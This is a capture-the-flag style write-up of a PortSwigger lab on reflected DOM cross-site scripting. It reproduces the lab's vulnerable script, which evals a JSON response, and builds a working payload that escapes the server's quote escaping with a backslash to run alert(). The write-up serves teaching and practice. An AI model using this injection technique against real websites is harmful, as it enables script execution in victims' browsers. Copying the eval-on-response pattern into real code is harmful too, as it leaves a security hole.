# Reflected DOM XSS

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected), you'll learn: Reflected DOM XSS! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

To solve this lab, create an injection that calls the `alert()` function.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-12/images/Pasted%20image%2020221230060413.png)

In here, we can see there is a search box.

Let's search something:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-12/images/Pasted%20image%2020221230060437.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-12/images/Pasted%20image%2020221230060459.png)

As you can see, our input is reflected to the web page.

**View source page:**
```html
<script src='resources/js/searchResults.js'></script>
<script>search('search-results')</script>
<section class="blog-header">
</section>
<section class=search>
    <form action=/ method=GET>
        <input type=text placeholder='Search the blog...' name=search>
        <button type=submit class=button>Search</button>
    </form>
</section>
```

**`/resources/js/searchResults.js`:**
```js
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        blogHeader.appendChild(h1);
        var hr = document.createElement("hr");
        blogHeader.appendChild(hr)

        for (var i = 0; i < searchResults.length; ++i)
        {
            var searchResult = searchResults[i];
            if (searchResult.id) {
                var blogLink = document.createElement("a");
                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);

                if (searchResult.headerImage) {
                    var headerImage = document.createElement("img");
                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
                    blogLink.appendChild(headerImage);
                }

                blogList.appendChild(blogLink);
            }

            blogList.innerHTML += "<br/>";

            if (searchResult.title) {
                var title = document.createElement("h2");
                title.innerText = searchResult.title;
                blogList.appendChild(title);
            }

            if (searchResult.summary) {
                var summary = document.createElement("p");
                summary.innerText = searchResult.summary;
                blogList.appendChild(summary);
            }

            if (searchResult.id) {
                var viewPostButton = document.createElement("a");
                viewPostButton.setAttribute("class", "button is-small");
                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
                viewPostButton.innerText = "View post";
            }
        }

        var linkback = document.createElement("div");
        linkback.setAttribute("class", "is-linkback");
        var backToBlog = document.createElement("a");
        backToBlog.setAttribute("href", "/");
        backToBlog.innerText = "Back to Blog";
        linkback.appendChild(backToBlog);
        blogList.appendChild(linkback);
    }
}
```

**I also notice that there is a JSON response:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-12/images/Pasted%20image%2020221230063538.png)

**Let's send that the Burp Repeater, and review `searchResults.js`:** 

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-12/images/Pasted%20image%2020221230063625.png)

Although `searchResults.js` might look scary, we can just **look all the sinks (Dangerous function), and trace them down.**

**In line 5, the response is used an `eval()` function, which is a sink:**
```js
eval('var searchResultsObj = ' + this.responseText);
```

Which means we can inject anything we want!

Now, our ultimate goal is to **let the JavaScript `eval()` our `alert()` function.**

**However, the server-side application did escaped our `"`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-12/images/Pasted%20image%2020221230064324.png)

As you can see, the `"` is being escaped.

**Luckly, after poking around, I found that the `\` is not escaped:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-12/images/Pasted%20image%2020221230064451.png)

**Armed with above information, we can craft an XSS payload:**
```
\"+alert(document.domain)}//
```

**Result:**
```
{"results":[],"searchTerm":"\\" alert(document.domain)}//"}
```

In the first `\`, we want to escape the `\` that the server-side application added to `"`, thus it'll close the string (`""`). Hence, it'll become: `eval({"results":[],"searchTerm":"");`.

Then, the `+` is to keep the string format normal. Hence, it'll become: `eval({"results":[],"searchTerm":""+alert(document.domain));`

Finally, we wait the JSON object finish. To do so, we first close the JSON object via `}`. Then, commented out `"}` via `//`.

**Hence, our final payload will be:**
```js
eval({"results":[],"searchTerm":""+alert(document.domain)});
```

Let's use our crafted payload to execute `alert()` function!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-12/images/Pasted%20image%2020221230070306.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-12/images/Pasted%20image%2020221230070318.png)

Nice!

# What we've learned:

1. Reflected DOM XSS